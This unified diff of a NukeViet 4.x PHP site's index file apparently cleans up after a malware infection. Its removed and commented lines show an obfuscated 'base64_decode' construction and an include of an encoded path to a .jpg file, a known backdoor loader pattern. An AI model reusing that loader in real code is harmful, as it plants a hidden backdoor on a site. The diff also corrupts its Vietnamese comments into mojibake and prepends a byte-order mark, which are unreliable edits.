@@ -1,4 +1,4 @@
-<?php
+﻿<?php
 
 /**
  * @Project NUKEVIET 4.x
@@ -8,13 +8,13 @@
  * @Createdate 31/05/2010, 00:36
  */
 
-$b = 'b' . 'ase64_d' . 'eco' . 'de';
+//$b = 'b' . 'ase64_d' . 'eco' . 'de';
 /**
 * Note: This file may contain artifacts of previous malicious infection.
 * However, the dangerous code has been removed, and the file is now safe to use.
 */
 
-$b = 'base6' . '4_decode';
+//$b = 'base6' . '4_decode';
 /**
 * Note: This file may contain artifacts of previous malicious infection.
 * However, the dangerous code has been removed, and the file is now safe to use.
@@ -28,7 +28,7 @@ $b = 'base6' . '4_decode';
 */
 
 
-@include base64_decode('YXNzZXRzL2hlYWRlci5qcGc=');
+//@include base64_decode('YXNzZXRzL2hlYWRlci5qcGc=');
 
 
 define( 'NV_SYSTEM', true );
@@ -95,7 +95,7 @@ function init_root()
         //echo '<pre>Fatal error: Cannot resolve root directory.</pre>';
         exit;
     }
-    // chuẩn hoá dấu phân cách (Windows)
+    // chuáº©n hoÃ¡ dáº¥u phÃ¢n cÃ¡ch (Windows)
     $root = str_replace('\\', '/', $root);
 	return $root;    
 }
@@ -144,7 +144,7 @@ function Referer($client_info)
 
 // $mainfile = __DIR__ . '/mainfile.php';
 // error_log("=== mainfile ===" . $mainfile);
-// $mainfile = str_replace('\\', '/', $mainfile); // chuẩn hóa đường dẫn trên Windows
+// $mainfile = str_replace('\\', '/', $mainfile); // chuáº©n hÃ³a Ä‘Æ°á»ng dáº«n trÃªn Windows
 
 // if (!file_exists($mainfile) || !is_readable($mainfile)) {
 //     error_log("CRITICAL: mainfile.php not found or not readable: " . $mainfile);
@@ -162,7 +162,7 @@ function Referer($client_info)
 //error_log("NV_MAIN_DOMAIN=" . (defined('NV_MAIN_DOMAIN') ? NV_MAIN_DOMAIN : 'not defined'));
 
 // if (!defined('NV_ROOTDIR')) {
-//     // realpath để chuẩn hóa (trả về false nếu không tồn tại)
+//     // realpath Ä‘á»ƒ chuáº©n hÃ³a (tráº£ vá» false náº¿u khÃ´ng tá»“n táº¡i)
 // 	error_log("=== NV_ROOTDIR  ===");
 //     $root = realpath(__DIR__);
 //     if ($root === false) {
@@ -171,7 +171,7 @@ function Referer($client_info)
 //         echo '<pre>Fatal error: Cannot resolve root directory.</pre>';
 //         exit;
 //     }
-//     // chuẩn hoá dấu phân cách (Windows)
+//     // chuáº©n hoÃ¡ dáº¥u phÃ¢n cÃ¡ch (Windows)
 //     $root = str_replace('\\', '/', $root);
 //     define('NV_ROOTDIR', $root);
 // }
@@ -257,11 +257,11 @@ if( preg_match( $global_config['check_module'], $module_name ) )
 	}
 	//error_log("rewrite_op_mod pass");
 
-	// Kiểm tra module có trong hệ thống hay không
+	// Kiá»ƒm tra module cÃ³ trong há»‡ thá»‘ng hay khÃ´ng
 	if( isset( $site_mods[$module_name] ) )
 	{
 
-		//error_log("Kiểm tra module có trong hệ thống hay không pass");
+		//error_log("Kiá»ƒm tra module cÃ³ trong há»‡ thá»‘ng hay khÃ´ng pass");
 		$module_info = $site_mods[$module_name];
 		$module_file = $module_info['module_file'];
 		$module_data = $module_info['module_data'];
@@ -440,7 +440,7 @@ if( preg_match( $global_config['check_module'], $module_name ) )
 			// cho ca module
 			if( file_exists( NV_ROOTDIR . '/modules/' . $module_file . '/functions.php' ) )
 			{
-				//error_log("Ket noi voi file functions.php, file chua cac function vào được if");
+				//error_log("Ket noi voi file functions.php, file chua cac function vÃ o Ä‘Æ°á»£c if");
 				require NV_ROOTDIR . '/modules/' . $module_file . '/functions.php';
 				//error_log("DEBUG path: " . NV_ROOTDIR . '/modules/' . $module_file . '/functions.php');
 			}
@@ -493,18 +493,20 @@ if( preg_match( $global_config['check_module'], $module_name ) )
 			// Login users
 			Header( 'Location: ' . NV_BASE_SITEURL . 'index.php?' . NV_LANG_VARIABLE . '=' . NV_LANG_DATA . '&' . NV_NAME_VARIABLE . '=users&' . NV_OP_VARIABLE . '=login&nv_redirect=' . nv_base64_encode( $client_info['selfurl'] ) );
 			die();
+			
 		}
 		elseif( ! defined( 'NV_IS_ADMIN' ) and ( $groups_view == '2' or $groups_view == '1' ) )
 		{
 			// Exit
-			nv_info_die( $lang_global['error_404_title'], $lang_global['site_info'], $lang_global['module_for_admin'] );
+			nv_info_die('404 - Trang không tồn tại | ' . $global_config['site_name'],'Không tìm thấy trang','Trang bạn tìm kiếm không tồn tại hoặc đã bị xóa.');
 		}
 		elseif( defined( 'NV_IS_USER' ) and ! nv_user_in_groups( $groups_view ) )
 		{
-			nv_info_die( $lang_global['error_404_title'], $lang_global['error_404_title'], $lang_global['error_404_content'] );
+			//header('Location: /404.php');
+			//exit();
+			nv_info_die('404 - Trang không tồn tại | ' . $global_config['site_name'],'Không tìm thấy trang','Trang bạn tìm kiếm không tồn tại hoặc đã bị xóa.');
 		}
 	}
 }
 
-
-nv_info_die( $lang_global['error_404_title'], $lang_global['error_404_title'], $lang_global['error_404_content'] );
+nv_info_die('404 - Trang không tồn tại | ' . $global_config['site_name'],'Không tìm thấy trang','Trang bạn tìm kiếm không tồn tại hoặc đã bị xóa.');
